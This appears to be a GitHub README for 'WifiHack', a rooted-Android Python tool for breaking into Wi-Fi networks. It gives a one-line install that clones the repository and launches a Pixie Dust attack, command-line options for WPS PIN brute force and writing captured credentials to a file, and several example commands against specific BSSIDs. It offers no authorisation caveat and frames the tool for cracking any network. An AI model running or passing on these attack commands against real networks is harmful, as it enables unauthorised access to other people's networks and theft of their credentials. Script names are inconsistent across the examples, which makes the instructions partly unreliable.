### wifi-hacking
<p align="center"><img src="https://user-images.githubusercontent.com/75953873/115979290-66309900-a55b-11eb-8259-4b125efc42bb.png"></p>

[![Python 3.5](https://img.shields.io/badge/Python-3.5-yellow.svg)](http://www.python.org/download/)
[![python](https://img.shields.io/badge/python-2.7-brightgreen.svg)](https://www.python.org/downloads/release/python-2714/)
[![OS](https://img.shields.io/badge/Tested%20On-Linux%20%7C%20Android-yellowgreen.svg)](https://termux.com/)



### How to update WifiHack
To check for updates and update, run the following command:
```
(cd WifiHack && git pull)
```

### One click Installation :
```bash
apt update && apt upgrade && pkg install -y root-repo && pkg install -y git tsu python wpa-supplicant pixiewps iw && git clone --depth 1 https://github.com/Gtajisan/WifiHack && sudo python WifiHack/WifiHack.py -i wlan0 -K
```
## Feutures and Contains :


```bash 

1)Scan Networks   

2)Getting Handshake

3)Create passed crack 

4)Install Wireless supported                  

5)WPS Networks attacks 

6)Scan for WPS Networks

7)Crack WiFi all of tham

8)Crack Handshake without monitor mod support 
```

## Tested On :

* Kali Linux (🚫)
* BlackArch Linux (🚫)
* Ubuntu (🚫)
* Kali Nethunter (🚫)
* Termux ( Rooted Devices✅)
* Parrot OS (🚫)
* তুমি আছো তুমি নাই (🤣)

## [Termux](https://termux.com/)
Please note that root access is required.  

### Hack WIfi Using Termux! (Requires Root)
<p align="center"><img src="https://l.top4top.io/p_28355s7ua0.png"></


#### Manually
**Installing requirements**
 ```
 pkg install -y root-repo
 pkg install -y git tsu python wpa-supplicant pixiewps iw openssl
 ```
**Getting WifiHack**
 ```
 
 git clone --depth 1 https://github.com/gtajisan/WifiHack WifiHack
 ```
 
#### Running
 ```
 sudo python WifiHack/WifiHack.py -i wlan0 -K
 ```
 
 
 
# Usage
```
 WifiHack.py <arguments>
 Required arguments:
     -i, --interface=<wlan0>  : Name of the interface to use

 Optional arguments:
     -b, --bssid=<mac>        : BSSID of the target AP
     -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
     -K, --pixie-dust         : Run Pixie Dust attack
     -B, --bruteforce         : Run online bruteforce attack
     --push-button-connect    : Run WPS push button connection

 Advanced arguments:
     -d, --delay=<n>          : Set the delay between pin attempts [0]
     -w, --write              : Write AP credentials to the file on success
     -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
     -X, --show-pixie-cmd     : Alway print Pixiewps command
     --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
     --iface-down             : Down network interface when the work is finished
     -l, --loop               : Run in a loop
     -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
     --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
                                (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
     -v, --verbose            : Verbose output
 ```

## Usage examples
Start Pixie Dust attack on a specified BSSID:
 ```
 sudo python3 farhan.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
 ```
Show avaliable networks and start Pixie Dust attack on a specified network:
 ```
 sudo python3 farhan.py -i wlan0 -K
 ```
Launch online WPS bruteforce with the specified first half of the PIN:
 ```
 sudo python3 farhan.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
 ```
 Start WPS push button connection:s
 ```
 sudo python3 farhan.py -i wlan0 --pbc
 ```
## Troubleshooting
#### "RTNETLINK answers: Operation not possible due to RF-kill"
 Just run:
```sudo rfkill unblock wifi```
#### "Device or resource busy (-16)"
 Try disabling Wi-Fi in the system settings and kill the Network manager. Alternatively, you can try running WifiHack with ```--iface-down``` argument.
#### The wlan0 interface disappears when Wi-Fi is disabled on Android devices with MediaTek SoC
 Try running WifiHack with the `--mtk-wifi` flag to initialize Wi-Fi device driver.

### screenshot
<p align="center"><img src="[https://user-images.githubusercontent.com/75953873/115979290-66309900-a55b-11eb-8259-4b125efc42bb.png](https://i.ibb.co/0GWdxHg/Photo-Lab-M-W-20231004-231206.jpg)https://i.ibb.co/0GWdxHg/Photo-Lab-M-W-20231004-231206.jpg"></p>

